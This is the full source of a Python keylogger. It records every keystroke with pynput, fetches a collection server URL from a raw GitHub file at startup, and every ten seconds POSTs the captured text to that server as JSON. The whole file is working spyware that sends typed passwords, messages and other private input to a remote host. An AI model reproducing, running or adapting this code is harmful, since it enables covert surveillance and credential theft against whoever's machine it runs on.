from pynput import keyboard
import requests
import json
import threading

# Global variable to store keystrokes
text = ""

# Time interval (in seconds) to send data to the server
time_interval = 10

# Get server URL safely
try:
    server_url = requests.get("https://raw.githubusercontent.com/0xc18/python-keylogger/refs/heads/main/host").text.strip()
    if not server_url.startswith("http"):
        raise ValueError("Invalid server URL received.")
except Exception as e:
    print(f"Failed to retrieve server URL: {e}")
    server_url = None

def send_post_req():
    global text
    if not server_url:
        print("Server URL is not set. Skipping data send.")
        return

    if text.strip():  # Only send if there's data
        try:
            payload = json.dumps({"KeyboardData": text})
            headers = {"Content-Type": "application/json"}
            response = requests.post(server_url, data=payload, headers=headers)
            print(f"Server response: {response.text}")
        except Exception as e:
            print(f"Error sending request: {e}")
        finally:
            text = ""
    # Schedule the next call
    timer = threading.Timer(time_interval, send_post_req)
    timer.daemon = True
    timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += '\n'
        elif key == keyboard.Key.tab:
            text += '\t'
        elif key == keyboard.Key.space:
            text += ' '
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_gr):
            pass  # Ignore modifier keys
        elif key == keyboard.Key.esc:
            print("Escape key pressed. Exiting.")
            return False  # Stop the listener
        else:
            text += key.char
    except AttributeError:
        # Handle special keys that don't have a char attribute
        text += f'[{key}]'

if __name__ == "__main__":
    if server_url:
        send_post_req()
    else:
        print("Server URL not set. Keylogger will run but won't send data.")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
